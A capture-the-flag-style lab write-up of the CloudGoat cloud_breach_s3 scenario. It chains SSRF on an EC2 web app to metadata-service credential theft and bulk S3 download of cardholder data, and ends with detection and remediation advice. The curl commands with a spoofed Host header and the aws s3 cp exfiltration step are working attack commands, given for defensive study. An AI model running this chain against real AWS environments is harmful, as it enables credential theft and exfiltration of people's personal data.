CloudGoat Lab: cloud_breach_s3
SSRF to IAM Credential Theft to S3 Exfiltration
Written by: Justin Steele | Platform: CloudGoat by Rhino Security Labs | Difficulty: Easy
Background
I put this lab together to get hands-on with a real AWS attack chain — specifically the SSRF to metadata credential theft
pattern that was used in the 2019 Capital One breach. I wanted to understand not just how the attack works mechanically,
but what it actually looks like from a defender's perspective and where the detection opportunities are.
CloudGoat spins up a deliberately vulnerable AWS environment using Terraform. The scenario here is cloud_breach_s3 —
there's an EC2 instance running a web app with an SSRF vulnerability, an IAM role attached to that instance with way too
many permissions, and an S3 bucket full of sensitive cardholder data. The goal is to chain those three things together and
exfiltrate the data.
Environment Setup
CloudGoat provisioned the following after running:
cloudgoat create cloud_breach_s3 --profile default
Target EC2 IP: 3.239.172.114
I set up Terraform and CloudGoat locally on WSL (Ubuntu on Windows) since CloudGoat uses shell scripts that don't run
natively on Windows. Worth noting if you're trying to replicate this on a Windows machine.
Walkthrough
Step 1 — Figuring Out What We're Working With
First thing I did was just hit the server and see what it returned:
curl http://3.239.172.114
The response was pretty telling: the server said it was configured to proxy requests to the EC2 metadata service, and to
modify the Host header. Honestly it spelled out the vulnerability for you. In a real engagement this would probably be less
obvious — you'd find it through parameter fuzzing or intercepting requests in Burp — but the concept is the same.
Step 2 — Exploiting the SSRF
The EC2 metadata service runs at 169.254.169.254 and is only reachable from within the instance itself. But because this
web app will proxy any request we throw at it, we can make the server talk to its own metadata endpoint on our behalf.
That's SSRF in a nutshell.
I spoofed the Host header to point at the metadata service:
curl http://3.239.172.114/latest/meta-data/iam/security-credentials/ \
-H "Host: 169.254.169.254"
That returned the name of the IAM role attached to the instance: cg-banking-WAF-Role-cgidspnmtej823. The name says
WAF role — meaning this was supposed to be a Web Application Firewall service account. It had no business being able to
read S3 cardholder data, but we'll get to that.
Step 3 — Pulling the Credentials
Once I had the role name I could request the actual temporary credentials AWS automatically vends to the instance through
IMDS:
curl http://3.239.172.114/latest/meta-data/iam/security-credentials/\
cg-banking-WAF-Role-cgidspnmtej823 \
-H "Host: 169.254.169.254"
This returned a JSON blob with an AccessKeyId, SecretAccessKey, and a Session Token. These are real, live AWS
credentials that belong to the IAM role — valid for about 6 hours. At this point I had everything I needed to impersonate that
role from my own machine.
Step 4 — Moving Laterally with the Stolen Credentials
I loaded them into a local AWS CLI profile I called 'stolen':
aws configure set aws_access_key_id ASIATIAN52TU7ID6UPKJ --profile stolen
aws configure set aws_secret_access_key [REDACTED] --profile stolen
aws configure set aws_session_token [REDACTED] --profile stolen
aws configure set region us-east-1 --profile stolen
From here I'm operating as the WAF role. Anything that role has permission to do, I can do. The question is what that role
can access.
Step 5 — Finding the Data
aws s3 ls --profile stolen
One bucket came back: cg-cardholder-data-bucket-cgidspnmtej823. The name alone is a red flag — a WAF role that
can list and read a cardholder data bucket is a massive over-permission. This is the kind of thing a quarterly IAM access
review should catch.
Step 6 — Exfiltrating the Data
aws s3 cp s3://cg-cardholder-data-bucket-cgidspnmtej823/ . --recursive --profile stolen
Three files came down:
- cardholder_data_primary.csv — 500 records with SSNs, full names, home addresses, email addresses
- cardholder_data_secondary.csv — additional cardholder PII
- cardholders_corporate.csv — 1,000 corporate accounts including plaintext passwords
The corporate password file was the worst of it. Plaintext passwords in S3, no encryption at rest apparent from the data. In a
real breach this would be the file that ends up for sale.
What I Learned
The thing that stood out most to me doing this wasn't the SSRF itself — it's how many layers of misconfiguration had to
stack up for this to work. The SSRF is the entry point, but the real damage comes from everything else: IMDSv1 still
enabled, an overly permissive IAM role, no S3 bucket policy restricting access, sensitive data sitting unencrypted. Remove
any one of those and the attack either fails or the impact is dramatically reduced.
From a blue team standpoint the most interesting thing is that this entire attack would light up GuardDuty. The moment
those IMDS credentials get used from an external IP, GuardDuty fires
UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration. If you have GuardDuty enabled and someone is actually
watching the alerts, this attack gets caught fast.
Detection Opportunities
GuardDuty
Would have fired UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration the moment the stolen credentials were used
from outside the EC2 instance. This is the single fastest win — if you don't have GuardDuty enabled, enable it today.
CloudTrail
Every S3 API call made with the stolen credentials would appear in CloudTrail with the source IP of my machine, not the
EC2 instance. A CloudWatch alarm on S3 GetObject calls from unexpected IPs on sensitive buckets would catch the
exfiltration phase.
# Alert on bulk access to sensitive buckets
aws logs put-metric-filter \
--filter-pattern '{ $.eventName = "GetObject" && $.requestParameters.bucketName = "*cardholder*" }' \
--metric-transformations metricName=CardholderS3Access,metricNamespace=Security,metricValue=1
IMDSv2 Enforcement
This is the fix that kills the root cause. IMDSv2 requires a PUT request to get a session token before any metadata can be
read. SSRF vulnerabilities can't make PUT requests the way this app is set up, so enforcing IMDSv2 would have stopped
the attack at step 2.
aws ec2 modify-instance-metadata-options \
--instance-id i-xxxxxxxxxx \
--http-tokens required \
--http-endpoint enabled
You can also enforce this org-wide with an AWS Config rule (ec2-imdsv2-check) or an SCP that denies RunInstances if
http-tokens isn't set to required.
What Should Have Been Done Differently
- Enforce IMDSv2 on all EC2 instances — this single control kills the credential theft path entirely
- Apply least-privilege IAM — a WAF service account should never have s3:GetObject on cardholder data
- Enable GuardDuty — it detects this exact attack pattern out of the box
- Restrict S3 bucket access with resource-based policies tied to VPC endpoints
- Fix the SSRF vulnerability — whitelist allowed outbound URLs, reject requests to internal IP ranges
- Encrypt sensitive S3 objects with KMS and restrict key usage to specific principals
- Enable S3 access logging and alert on anomalous download volume
